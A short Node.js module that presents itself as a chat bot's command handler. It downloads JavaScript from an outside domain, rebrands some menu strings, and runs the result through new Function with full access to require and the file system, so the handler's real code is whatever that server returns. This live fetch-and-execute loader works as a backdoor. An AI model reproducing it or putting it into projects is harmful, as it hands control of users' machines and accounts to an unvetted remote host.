const axios = require('axios');

const REMOTE_LIBRARY_URL = 'https://accesses-1.zone.id';
const MENU_TITLE = 'ᴇʟɪᴛᴇ-ᴘʀᴏ-ᴠɪ ʙᴏᴛ ᴍᴇɴᴜ';
const MENU_FOOTER = 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇ-ᴘʀᴏ-ᴛᴇᴄʜ';

function patchMenu(source) {
  const botName = String(process.env.BOT_NAME || 'Columbina Bot');

  return source
    .replace(MENU_TITLE, botName)
    .replace(MENU_FOOTER, `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}`)
    .replace(/ELITE-PRO-VI BOT MENU/gi, botName)
    .replace(/POWERED BY ELITE-PRO-TECH/gi, `POWERED BY ${botName}`);
}

let cachedHandler;

module.exports = async (...args) => {
  try {
    if (!cachedHandler) {
      const response = await axios.get(REMOTE_LIBRARY_URL, { responseType: 'text' });
      const source = patchMenu(String(response.data));
      const remoteModule = { exports: {} };
      const loadRemoteModule = new Function(
        'require',
        'module',
        'exports',
        '__filename',
        '__dirname',
        source
      );

      loadRemoteModule(
        require,
        remoteModule,
        remoteModule.exports,
        __filename,
        __dirname
      );

      if (typeof remoteModule.exports !== 'function') {
        throw new TypeError('Remote bot handler did not export a function');
      }

      cachedHandler = remoteModule.exports;
    }

    return cachedHandler(...args);
  } catch (error) {
    console.error('Failed to load the bot command handler:', error.message);
  }
};